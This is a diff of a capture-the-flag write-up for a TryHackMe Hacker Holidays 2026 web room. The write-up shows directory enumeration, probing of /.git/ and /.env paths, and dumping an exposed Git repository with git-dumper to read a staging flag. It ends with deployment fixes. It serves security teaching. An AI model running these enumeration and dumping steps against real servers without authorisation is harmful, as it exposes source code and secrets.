@@ -1,64 +1,24 @@
 # Hacker Holidays: Day 2 - Room 404
 
-> 📝 **Write-up credit:** Based on the English write-up by [`shelvy1337` (Cybersecurity-Writeups)](https://github.com/shelvy1337/Cybersecurity-Writeups/tree/main/TryHackMe/Hacker%20Holidays%202026) and used with attribution per that repository's terms. Flag values are censored as `THM{REDACTED}` per this repository's convention.
+**Category:** Web
+**Difficulty:** Very Easy
+
+## 🛎️ Concierge Briefing
+> The Byte Lotus guest-experience platform went live in a hurry, and the night-shift developer shipped more than the website. Somewhere on port 8080, a whole repository is waiting to be read.
 
 ---
 
-> Room 404 was not hidden behind complex application logic. The issue was a classic deployment mistake: the `.git` directory was exposed on the production web server, making it possible to reconstruct the source code and read internal staging notes.
+## 🕵️‍♂️ Recon
 
-## Quick Overview
+Target: `http://MACHINE_IP:8080`. The briefing says the developer shipped "more than the website", so I wasn't hunting for application bugs — I was hunting for developer leftovers.
 
-| Field | Value |
-| --- | --- |
-| Platform | TryHackMe |
-| Event | Hacker Holidays 2026 |
-| Day | 2 |
-| Category | Web |
-| Difficulty | Very Easy |
-| Techniques | Directory Enumeration, Information Disclosure, Exposed Git Repository |
-| Target | `http://MACHINE_IP:8080` |
-
-## Objective
-
-The goal was to dump the exposed source code and find the flag. The challenge description strongly hinted that the developer had deployed more than just the website:
-
-```text
-The Byte Lotus guest-experience platform went live in a hurry,
-and the night-shift developer shipped more than the website.
-```
-
-That pointed toward developer files or directories that should never have been publicly accessible.
-
-## Attack Path
-
-1. I opened the application on port `8080`.
-2. I performed directory enumeration.
-3. I manually checked common paths left behind by version control systems.
-4. I confirmed that the `.git` directory was publicly accessible.
-5. I dumped the repository with `git-dumper`.
-6. I reviewed the source files and found the flag in `README.md`.
-
-## Recon
-
-After starting the machine, the application was available at:
-
-```text
-http://MACHINE_IP:8080
-```
-
-The first step was to check the server response:
-
-```bash
-curl -i http://MACHINE_IP:8080
-```
-
-The site was working, but the room description made it clear that the interesting part was something not directly linked from the page. I moved on to directory enumeration:
+A gobuster sweep found the usual surface:
 
 ```bash
 gobuster dir -u http://MACHINE_IP:8080 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-For this kind of challenge, it is also worth manually checking common paths that are often deployed by mistake:
+But the interesting paths never show up in default wordlists. I checked the classic version-control leftovers by hand:
 
 ```text
 /.git/
@@ -67,106 +27,61 @@ For this kind of challenge, it is also worth manually checking common paths that
 /.env
 ```
 
-In this case, the important path was:
+`/.git/` responded — that's the entire game.
 
-```text
-http://MACHINE_IP:8080/.git/
-```
+## 🔍 Confirming the .git Exposure
 
-The `.git` directory was reachable from the browser, which meant the repository could likely be reconstructed.
-
-## Confirming The Issue
-
-Opening `.git/` exposed the Git repository structure. The `HEAD` file could also be checked directly:
+A live `.git` directory on a web server means source, history, and internal notes are all downloadable. The `HEAD` file confirms Git metadata is being served:
 
 ```bash
 curl http://MACHINE_IP:8080/.git/HEAD
 ```
 
-Example response:
-
 ```text
 ref: refs/heads/main
 ```
 
-This confirms that the web server is exposing Git metadata, not just the public site. Reading Git objects manually is inconvenient because many of them are stored as zlib-compressed objects. Reconstructing the full repository locally is much faster.
-
-## Dumping The Repository
-
-I used `git-dumper` to download the exposed repository.
-
-If the tool is not installed yet:
+Reading raw Git objects by hand is painful (they're zlib-compressed), so I pulled the repository down properly with `git-dumper`:
 
 ```bash
-python3 -m pip install git-dumper
-```
-
-Then dump the repository:
-
-```bash
-python3 -m git_dumper http://MACHINE_IP:8080/.git/ dumped_repo
-```
-
-Alternatively, if the command is available directly:
-
-```bash
+pip install git-dumper
 git-dumper http://MACHINE_IP:8080/.git/ dumped_repo
 ```
 
-After the dump finishes, move into the reconstructed directory:
+## 🧨 The Payload
 
-```bash
-cd dumped_repo
-ls -la
-```
-
-The repository contained files such as:
-
-- `app.js`
-- `index.html`
-- `README.md`
-
-## Source Code Analysis
-
-The most interesting file was `README.md`, which contained internal staging notes:
+The reconstructed repo contained `app.js`, `index.html`, and a `README.md` carrying internal staging notes:
 
 ```bash
 cat README.md
 ```
 
-The file stated that this folder should not have been deployed:
-
 ```text
 # Byte Lotus - Guest Experience Platform
 Internal staging repository for the guest app and concierge personalization
 service. Do not deploy this folder to production.
-Staging flag (remove before launch): THM{...}
+Staging flag (remove before launch): THM{REDACTED}
 ```
 
-The flag had been left inside repository documentation that became publicly accessible due to the deployment misconfiguration.
+The staging flag was sitting in repository documentation that should never have been shipped to the web root.
 
-## Flag
-
-After reading `README.md` and submitting the value from the staging line, the answer is accepted:
+## 🚩 The Flag
 
 **Flag:** `THM{REDACTED}`
 
-## Why It Works
+## 💡 Why This Works
 
-The `.git` directory stores the full repository structure and history: references, the index, objects, and metadata needed by Git to reconstruct the project files. If that directory is exposed over HTTP, an attacker can fetch the objects and rebuild the source code offline.
+`.git` stores the complete repository — refs, index, and packed or loose objects. Expose that over HTTP and anyone can reconstruct the full source offline, including secrets the developer committed. The vulnerability here was deployment hygiene, not application logic.
 
-In this challenge, the weakness was not in the application logic itself, but in the deployment configuration. A developer directory containing internal notes and the staging flag was shipped with the website.
+## 🛡️ Fixes
 
-## How To Fix It
+- Never deploy `.git`, `.svn`, `.hg`, or `.env` to production
+- Block access to hidden files and directories at the web server / reverse proxy level
+- Publish only build artifacts, never source directories
+- Add CI/CD checks that fail the build when VCS directories are exposed
 
-- Never deploy `.git`, `.svn`, `.hg`, or other version control directories.
-- Block access to hidden files and directories at the web server level.
-- Use a build and deployment process that publishes only the required artifacts.
-- Do not store secrets, flags, or operational notes in a repository served by the web application.
-- Add CI/CD checks that detect exposed developer directories before deployment.
+## 📝 Final Thoughts
 
-## Summary
+Classic information disclosure: enumerate → spot `/.git/` → dump with `git-dumper` → read `README.md`. Fifteen minutes and the internal repository is yours.
 
-Day 2 of Hacker Holidays 2026 is a classic information disclosure challenge caused by an exposed `.git` directory. The path was simple: find the hidden directory, dump the repository, and read the staging documentation.
-
-The core idea: directory enumeration, confirm `.git/`, dump the repository, and read `README.md`.
+**Documented and tested for TryHackMe — Hacker Holidays 2026**
